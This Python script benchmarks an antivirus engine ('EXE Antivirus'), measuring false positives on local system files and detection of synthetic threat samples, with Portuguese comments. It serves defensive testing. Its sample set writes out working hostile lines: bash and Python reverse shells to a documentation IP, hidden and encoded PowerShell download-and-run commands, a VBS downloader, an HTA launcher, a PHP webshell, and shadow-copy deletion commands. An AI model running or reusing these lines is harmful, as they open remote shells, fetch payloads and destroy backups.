"""Laboratório de benchmark reproduzível do EXE Antivirus.

Mede, com dados reais desta máquina:
- Falsos positivos em ARQUIVOS LEGÍTIMOS REAIS (programas, bibliotecas, scripts e documentos do sistema
  operacional e do Python instalados), amostrados de forma determinística;
- Detecção em um conjunto SINTÉTICO e INOFENSIVO de ameaças de teste (EICAR, executáveis montados com
  importações de injetor/keylogger, macros, scripts ofuscados de teste, compactados aninhados...).
- Precisão, recall, F1, taxa de falsos positivos, taxa de bloqueios incorretos, tempo por arquivo,
  memória e CPU.

Uso:
    python tools/benchmark.py                      # 3000 arquivos legítimos, relatório em dist/benchmark
    python tools/benchmark.py --benign 10000 --out pasta
    python tools/benchmark.py --dirs /usr/bin /opt # pastas legítimas escolhidas

LIMITAÇÕES (também gravadas no relatório): as ameaças são sintéticas — medem se as regras funcionam, não a
eficácia contra malware real em circulação; os números NÃO são comparáveis com AV-TEST/AV-Comparatives,
que usam milhares de amostras reais e metodologia própria.
"""
from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import html
import io
import json
import os
import platform
import statistics
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

MAX_BENIGN_SIZE = 32 * 1024 * 1024


# --------------------------------------------------------------------------- conjuntos
def default_benign_dirs() -> list[str]:
    import sysconfig
    dirs = [sysconfig.get_paths()["stdlib"], sysconfig.get_paths()["purelib"]]
    if os.name == "nt":
        win = os.environ.get("SystemRoot", r"C:\Windows")
        dirs += [os.path.join(win, "System32"), os.path.join(win, "SysWOW64"),
                 os.environ.get("ProgramFiles", r"C:\Program Files"),
                 os.environ.get("ProgramFiles(x86)", r"C:\Program Files (x86)")]
    else:
        dirs += ["/usr/bin", "/usr/sbin", "/usr/lib/x86_64-linux-gnu", "/usr/share/doc", "/usr/lib/python3",
                 "/etc", "/usr/share/applications", "/usr/include"]
    return [d for d in dirs if d and os.path.isdir(d)]


def collect_benign(dirs: list[str], n: int, seed: str = "exeav") -> list[str]:
    """Amostra determinística: os mesmos arquivos são escolhidos em execuções repetidas na mesma máquina."""
    from exeav import paths
    excl = paths.Exclusions()
    found = []
    for d in dirs:
        for root, subdirs, files in os.walk(d):
            subdirs[:] = [s for s in subdirs if s not in ("__pycache__", ".git", "WinSxS", "DriverStore")]
            if excl.is_excluded(root):
                subdirs[:] = []
                continue
            for f in files:
                p = os.path.join(root, f)
                try:
                    if os.path.islink(p) or not os.path.isfile(p):
                        continue
                    sz = os.path.getsize(p)
                except OSError:
                    continue
                if 0 < sz <= MAX_BENIGN_SIZE:
                    found.append(p)
    found = sorted(set(found), key=lambda p: hashlib.sha256((seed + p).encode("utf-8", "replace")).hexdigest())
    return found[:n]


def synthetic_threats() -> dict[str, bytes]:
    """Ameaças de teste inofensivas (não executam nada perigoso; usam endereços de documentação RFC 5737)."""
    import samples
    from test_hardening import OBFUSCATED
    dl = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')"
    base = {
        "eicar": samples.eicar(),
        "pe-injetor-ransomware": samples.injector_ransom_pe(),
        "pe-keylogger": samples.keylogger_pe(),
        "docm-macro": samples.macro_docm(),
        "doc-macro-ole": samples.macro_doc(),
        "follina": samples.follina_docx(),
        "pdf-js": samples.malicious_pdf(),
        "ps-oculto": b'powershell -nop -w hidden -c "' + dl.encode() + b'"',
        "ps-enc": b"powershell -enc " + base64.b64encode(dl.encode("utf-16le")),
        "bash-reverso": b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n",
        "python-reverso": (b"import socket,subprocess,os\ns=socket.socket();s.connect(('203.0.113.7',4444))\n"
                           b"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
                           b"subprocess.call(['/bin/sh','-i'])\n"),
        "php-webshell": b"<?php system($_GET['cmd']); ?>",
        "hta-shell": b"<html><script language='VBScript'>CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -c "
                     + dl.encode() + b"\", 0</script></html>",
        "vbs-download": b'Set x = CreateObject("MSXML2.XMLHTTP")\r\nx.Open "GET", "http://203.0.113.7/a.exe", False\r\n'
                        b'x.Send\r\nSet s = CreateObject("ADODB.Stream")\r\ns.Type = 1\r\ns.Open\r\ns.Write x.responseBody\r\n'
                        b's.SaveToFile "C:\\Users\\Public\\a.exe", 2\r\nCreateObject("WScript.Shell").Run "C:\\Users\\Public\\a.exe", 0\r\n',
        "ransom-cmd": b"vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n"
                      b"wbadmin delete catalog -quiet\r\n",
    }
    for k, v in OBFUSCATED.items():
        base[f"ofuscado: {k}"] = v
    out = {}
    for name, data in base.items():
        out[name] = data
        # o nome/extensão não pode mudar o veredito (detecção pelo conteúdo)
        out[f"{name} [renomeado .jpg]"] = data
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("documento.txt", data)
        out[f"{name} [dentro de zip]"] = buf.getvalue()
    out["bash-reverso [gzip]"] = gzip.compress(base["bash-reverso"])
    return out


def benign_lookalikes() -> dict[str, bytes]:
    """Arquivos legítimos que PARECEM perigosos (documentação, scripts de administração...)."""
    from test_hardening import LOOKALIKES
    return dict(LOOKALIKES)


# --------------------------------------------------------------------------- execução
def _scan_all(engine, items: list[tuple[str, str]], progress=None) -> list[dict]:
    rows = []
    for i, (label, path) in enumerate(items):
        t = time.perf_counter()
        try:
            r = engine.scan_file(path).result
            verdict, score, name, err, skipped = r.verdict, r.score, r.threat_name, r.error, r.skipped
            ids = [x.id for x in r.indicators if x.weight > 0]
        except Exception as e:  # noqa: BLE001 — um arquivo problemático não pode derrubar o benchmark
            verdict, score, name, err, skipped, ids = "erro", 0, "", f"{type(e).__name__}: {e}", True, []
        dt = time.perf_counter() - t
        rows.append({"label": label, "path": path, "verdict": verdict, "score": score, "threat": name,
                     "rules": ids, "ms": round(dt * 1000, 2), "skipped": skipped, "error": err})
        if progress and i % 250 == 0:
            progress(i, len(items))
    return rows


def _metrics(mal_rows: list[dict], ben_rows: list[dict]) -> dict:
    def detected(r):
        return r["verdict"] in ("malicioso", "suspeito")
    mal = [r for r in mal_rows if not r["skipped"]]
    ben = [r for r in ben_rows if not r["skipped"]]
    tp = sum(detected(r) for r in mal)
    fn = len(mal) - tp
    fp = sum(detected(r) for r in ben)
    tn = len(ben) - fp
    blocked_wrong = sum(r["verdict"] == "malicioso" for r in ben)
    tp_strict = sum(r["verdict"] == "malicioso" for r in mal)
    prec = tp / (tp + fp) if tp + fp else 0.0
    rec = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * prec * rec / (prec + rec) if prec + rec else 0.0
    times = [r["ms"] for r in mal_rows + ben_rows]
    det_times = [r["ms"] for r in mal if detected(r)]
    return {
        "verdadeiros_positivos": tp, "falsos_negativos": fn, "falsos_positivos": fp, "verdadeiros_negativos": tn,
        "precisao": round(prec, 6), "recall": round(rec, 6), "f1": round(f1, 6),
        "taxa_deteccao": round(rec, 6),
        "taxa_deteccao_como_malicioso": round(tp_strict / len(mal), 6) if mal else 0.0,
        "taxa_falsos_positivos": round(fp / len(ben), 6) if ben else 0.0,
        "taxa_bloqueios_incorretos": round(blocked_wrong / len(ben), 6) if ben else 0.0,
        "bloqueios_incorretos": blocked_wrong,
        "tempo_medio_por_arquivo_ms": round(statistics.mean(times), 3) if times else 0,
        "tempo_p95_ms": round(sorted(times)[int(len(times) * 0.95) - 1], 3) if times else 0,
        "tempo_medio_deteccao_ms": round(statistics.mean(det_times), 3) if det_times else 0,
        "ignorados": len(mal_rows) - len(mal) + len(ben_rows) - len(ben),
    }


def run(benign_n: int = 3000, dirs: list[str] | None = None, out_dir: str | None = None,
        without_reputation: bool = True, quiet: bool = False) -> dict:
    import psutil

    from exeav import APP_NAME, VERSION, config
    from exeav.engine import trust
    from exeav.engine.engine import Engine
    from exeav.engine.rules import load_builtin_dicts
    log = (lambda *a: None) if quiet else (lambda *a: print(*a, flush=True))
    proc = psutil.Process()
    cpu0 = proc.cpu_times()
    t_start = time.time()
    t0 = time.perf_counter()
    engine = Engine(config.Settings())
    startup_ms = (time.perf_counter() - t0) * 1000

    dirs = dirs or default_benign_dirs()
    log(f"coletando até {benign_n} arquivos legítimos de {len(dirs)} pasta(s)…")
    benign_paths = collect_benign(dirs, benign_n)
    tmp = tempfile.mkdtemp(prefix="exeav-bench-")
    mal_items, look_items = [], []
    for i, (name, data) in enumerate(synthetic_threats().items()):
        p = os.path.join(tmp, f"amostra-{i:03d}.bin")
        Path(p).write_bytes(data)
        mal_items.append((name, p))
    for i, (name, data) in enumerate(benign_lookalikes().items()):
        p = os.path.join(tmp, f"legitimo-{i:03d}.txt")
        Path(p).write_bytes(data)
        look_items.append((f"parecido com ameaça: {name}", p))
    ben_items = [("sistema", p) for p in benign_paths] + look_items
    log(f"{len(mal_items)} ameaças sintéticas, {len(ben_items)} arquivos legítimos")

    rss_peak = proc.memory_info().rss
    mal_rows = _scan_all(engine, mal_items)
    rss_peak = max(rss_peak, proc.memory_info().rss)
    ben_rows = _scan_all(engine, ben_items, progress=lambda i, n: log(f"  legítimos: {i}/{n}"))
    rss_peak = max(rss_peak, proc.memory_info().rss)
    m = _metrics(mal_rows, ben_rows)

    no_rep = None
    if without_reputation:
        # mesma varredura sem a reputação (assinatura digital / pacote do sistema): mostra quanto as
        # heurísticas sozinhas erram — o número honesto para arquivos de origem desconhecida
        orig = trust.check
        trust.check = lambda path: (False, "")
        try:
            e2 = Engine(config.Settings())
            ben2 = _scan_all(e2, [it for it in ben_items])
        finally:
            trust.check = orig
        no_rep = _metrics(mal_rows, ben2)
        no_rep["falsos_positivos_lista"] = [{"arquivo": r["path"], "veredito": r["verdict"], "pontos": r["score"],
                                             "regras": r["rules"]} for r in ben2
                                            if r["verdict"] in ("malicioso", "suspeito")][:200]
    cpu1 = proc.cpu_times()
    report = {
        "produto": APP_NAME, "versao": VERSION, "motor": engine.version,
        "regras": len(load_builtin_dicts()), "assinaturas_hash": engine.sigdb.count,
        "data": time.strftime("%Y-%m-%d %H:%M:%S"), "duracao_s": round(time.time() - t_start, 1),
        "sistema": f"{platform.system()} {platform.release()} ({platform.machine()})",
        "python": platform.python_version(),
        "metodologia": {
            "ameacas": "Conjunto sintético e inofensivo gerado por tools/benchmark.py (EICAR, PE montados com "
                       "importações de injetor/keylogger, macros VBA, Follina, PDF com JavaScript, scripts de teste "
                       "ofuscados) em 3 formas: original, renomeado e dentro de ZIP.",
            "legitimos": f"Amostra determinística de até {benign_n} arquivos reais das pastas: " + "; ".join(dirs)
                         + f" + {len(look_items)} arquivos legítimos que parecem ameaças.",
            "deteccao": "Positivo = veredito 'malicioso' ou 'suspeito'. Bloqueio incorreto = arquivo legítimo com "
                        "veredito 'malicioso' (seria isolado automaticamente).",
            "reputacao": "A primeira medição usa o motor completo (com reputação). A segunda desliga a reputação para "
                         "medir só as heurísticas.",
        },
        "limitacoes": [
            "Ameaças sintéticas medem se as regras funcionam, não a eficácia contra malware real em circulação.",
            "Os resultados NÃO são comparáveis com AV-TEST, AV-Comparatives ou outros laboratórios: conjuntos, "
            "configurações e condições diferentes.",
            "Os arquivos legítimos vêm só desta máquina; outras máquinas/programas podem ter outros falsos positivos.",
            "Muitos arquivos do sistema recebem bônus de reputação; por isso também é relatado o resultado sem ela.",
        ],
        "conjunto": {"ameacas": len(mal_items), "legitimos": len(ben_items), "legitimos_do_sistema": len(benign_paths)},
        "metricas": m,
        "metricas_sem_reputacao": no_rep,
        "recursos": {"pico_memoria_mb": round(rss_peak / 2 ** 20, 1),
                     "cpu_s": round((cpu1.user - cpu0.user) + (cpu1.system - cpu0.system), 2),
                     "inicializacao_motor_ms": round(startup_ms, 1)},
        "falhas": [{"arquivo": r["path"], "erro": r["error"]} for r in mal_rows + ben_rows if r["verdict"] == "erro"],
        "ameacas_nao_detectadas": [r["label"] for r in mal_rows if r["verdict"] not in ("malicioso", "suspeito")],
        "falsos_positivos": [{"arquivo": r["path"], "veredito": r["verdict"], "pontos": r["score"],
                              "ameaca": r["threat"], "regras": r["rules"]}
                             for r in ben_rows if r["verdict"] in ("malicioso", "suspeito")],
    }
    report["taxa_falhas"] = round(len(report["falhas"]) / max(1, len(mal_rows) + len(ben_rows)), 6)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)
        Path(out_dir, "benchmark.json").write_text(json.dumps(report, ensure_ascii=False, indent=1), "utf-8")
        Path(out_dir, "benchmark.html").write_text(render_html(report), "utf-8")
        log(f"relatório: {out_dir}/benchmark.html")
    import shutil
    shutil.rmtree(tmp, ignore_errors=True)
    return report


def _pct(x: float) -> str:
    return f"{x * 100:.3f}%"


def render_html(r: dict) -> str:
    m = r["metricas"]
    e = html.escape

    def table(mm: dict) -> str:
        rows = [("Precisão", _pct(mm["precisao"])), ("Recall (taxa de detecção)", _pct(mm["recall"])),
                ("F1", f"{mm['f1']:.4f}"), ("Taxa de falsos positivos", _pct(mm["taxa_falsos_positivos"])),
                ("Taxa de bloqueios incorretos", _pct(mm["taxa_bloqueios_incorretos"])),
                ("Detectado como malicioso", _pct(mm["taxa_deteccao_como_malicioso"])),
                ("VP / FN / FP / VN", f"{mm['verdadeiros_positivos']} / {mm['falsos_negativos']} / "
                                      f"{mm['falsos_positivos']} / {mm['verdadeiros_negativos']}"),
                ("Tempo médio por arquivo", f"{mm['tempo_medio_por_arquivo_ms']} ms (p95 {mm['tempo_p95_ms']} ms)"),
                ("Tempo médio até a detecção", f"{mm['tempo_medio_deteccao_ms']} ms")]
        return "<table>" + "".join(f"<tr><th>{e(a)}</th><td>{e(b)}</td></tr>" for a, b in rows) + "</table>"
    fps = "".join(f"<tr><td>{e(x['arquivo'])}</td><td>{e(x['veredito'])}</td><td>{x['pontos']}</td>"
                  f"<td>{e(', '.join(x['regras']))}</td></tr>" for x in r["falsos_positivos"]) \
        or "<tr><td colspan=4>nenhum</td></tr>"
    nr = r.get("metricas_sem_reputacao")
    return f"""<!doctype html><html lang="pt-BR"><meta charset="utf-8"><title>Benchmark EXE Antivirus</title>
<style>body{{font-family:system-ui,sans-serif;max-width:1000px;margin:24px auto;padding:0 16px;color:#1d2733}}
table{{border-collapse:collapse;width:100%;margin:8px 0 20px}}th,td{{border:1px solid #d6dde6;padding:6px 10px;
text-align:left;font-size:14px;vertical-align:top}}th{{background:#f2f5f9;width:34%}}.warn{{background:#fff6e0;
border:1px solid #f0c36d;padding:10px 14px;border-radius:8px}}code{{font-size:13px}}</style>
<h1>Benchmark do EXE Antivirus {e(r['versao'])}</h1>
<p>{e(r['data'])} · {e(r['sistema'])} · Python {e(r['python'])} · motor {e(r['motor'])} · {r['regras']} regras ·
{r['assinaturas_hash']} assinaturas · duração {r['duracao_s']} s</p>
<div class="warn"><b>Limitações:</b><ul>{''.join(f'<li>{e(x)}</li>' for x in r['limitacoes'])}</ul></div>
<h2>Conjunto</h2><p>{r['conjunto']['ameacas']} ameaças sintéticas · {r['conjunto']['legitimos']} arquivos legítimos
({r['conjunto']['legitimos_do_sistema']} do sistema)</p>
<h2>Resultado (motor completo)</h2>{table(m)}
{('<h2>Sem reputação (só heurísticas)</h2>' + table(nr)) if nr else ''}
<h2>Recursos</h2><table><tr><th>Pico de memória</th><td>{r['recursos']['pico_memoria_mb']} MB</td></tr>
<tr><th>CPU</th><td>{r['recursos']['cpu_s']} s</td></tr><tr><th>Inicialização do motor</th>
<td>{r['recursos']['inicializacao_motor_ms']} ms</td></tr><tr><th>Taxa de falhas</th><td>{_pct(r['taxa_falhas'])}</td></tr></table>
<h2>Ameaças não detectadas</h2><p>{e(', '.join(r['ameacas_nao_detectadas']) or 'nenhuma')}</p>
<h2>Falsos positivos (motor completo)</h2><table><tr><th>Arquivo</th><th>Veredito</th><th>Pontos</th><th>Regras</th></tr>{fps}</table>
<h2>Metodologia</h2><table>{''.join(f'<tr><th>{e(k)}</th><td>{e(v)}</td></tr>' for k, v in r['metodologia'].items())}</table>
<p>Reproduzir: <code>python tools/benchmark.py --benign {r['conjunto']['legitimos_do_sistema']}</code></p></html>"""


def main() -> int:
    ap = argparse.ArgumentParser(description="Benchmark reproduzível de detecção e falsos positivos")
    ap.add_argument("--benign", type=int, default=3000, help="quantidade de arquivos legítimos (padrão 3000)")
    ap.add_argument("--dirs", nargs="+", help="pastas com arquivos legítimos")
    ap.add_argument("--out", default=str(ROOT / "dist" / "benchmark"), help="pasta do relatório")
    ap.add_argument("--max-fpr", type=float, default=None, help="falha (código 1) se a taxa de falsos positivos passar disso")
    ap.add_argument("--min-recall", type=float, default=None, help="falha (código 1) se o recall ficar abaixo disso")
    a = ap.parse_args()
    os.environ.setdefault("EXEAV_DATA_DIR", tempfile.mkdtemp(prefix="exeav-bench-data-"))
    r = run(a.benign, a.dirs, a.out)
    m = r["metricas"]
    print(json.dumps({"metricas": m, "sem_reputacao": {k: v for k, v in (r["metricas_sem_reputacao"] or {}).items()
                                                        if k != "falsos_positivos_lista"},
                      "recursos": r["recursos"], "nao_detectadas": r["ameacas_nao_detectadas"]},
                     ensure_ascii=False, indent=1))
    fail = (a.max_fpr is not None and m["taxa_falsos_positivos"] > a.max_fpr) or \
           (a.min_recall is not None and m["recall"] < a.min_recall)
    return 1 if fail else 0


if __name__ == "__main__":
    sys.exit(main())
